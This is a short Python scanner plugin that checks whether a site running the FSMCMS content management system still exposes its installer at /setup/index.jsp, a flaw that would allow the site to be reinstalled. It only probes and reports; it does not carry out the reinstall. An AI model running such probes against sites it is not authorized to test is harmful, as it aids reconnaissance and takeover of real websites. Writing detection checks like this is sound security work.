#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: FSMCMS网站重装漏洞
referer: http://www.wooyun.org/bugs/wooyun-2010-043380
author: Lucifer
description: 东方文辉网站群内容管理系统FSMCMS网站重装漏洞,网站安装程序在安装之后默认没有删除，也没有限制，可以很容易的恶意把网站重装了。
'''
import sys

import requests


class fsmcms_setup_reinstall_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
        "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/setup/index.jsp"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)

            if r'</font><input type="text" name="SetUpPath"' in req.text:
                return "[+]存在FSMCMS网站重装漏洞...(中危)\tpayload: "+vulnurl

        except:
            return "[-]connect timeout"

if __name__ == "__main__":

    testVuln = fsmcms_setup_reinstall_BaseVerify(sys.argv[1])
    testVuln.run()
